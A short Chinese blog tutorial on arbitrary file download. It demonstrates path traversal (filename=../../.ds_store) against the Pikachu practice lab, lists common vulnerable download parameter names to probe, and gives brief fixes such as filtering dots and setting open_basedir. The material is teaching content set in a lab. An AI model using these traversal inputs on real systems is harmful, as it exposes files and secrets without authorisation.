---
title: WEB攻防--任意文件下载
date: 2024年8月27日
updated: 2024年8月27日
tags:
  - 渗透
categories: 守夜
keywords:
description: 守夜-任意文件下载

---

以皮卡丘为例

![](https://pic.imgdb.cn/item/66cece29d9c307b7e9574db5.png)

上面是url，页面上说了是点击头像下载头像图片

所以他的下载地址是

```
192.168.31.172/pikachu/vul/unsafedownload/exedownload.php?filename=kb.png
```

知道这个以后就可以进行目录穿越了，比如说这个文件夹下有个.ds_store的文件


![](https://pic.imgdb.cn/item/66cecfdcd9c307b7e95c345c.png)

我就可以用


```
192.168.31.172/pikachu/vul/unsafedownload/exedownload.php?filename=../../.ds_store
```

把它下载下来


原理

![](https://pic.imgdb.cn/item/66ced054d9c307b7e95e0853.png)


利用方式：
```
一般链接利用方式

download.php?path=
down.php?file=
download.php?filename=
data.php?file=

或者包含参数

&src=
&Data=
&Path=
&filepath=
&inputfile=

```


![](https://pic.imgdb.cn/item/66d11e36d9c307b7e9045875.png)


![](https://pic.imgdb.cn/item/66d11e4ad9c307b7e9046596.png)


漏洞修复:
```
1.过滤.，使得用户不能回溯上一级目录i
2.正则盐分判断用户输入参数的格式
3.php.ini配置open_basedir限制文件访问范围
```

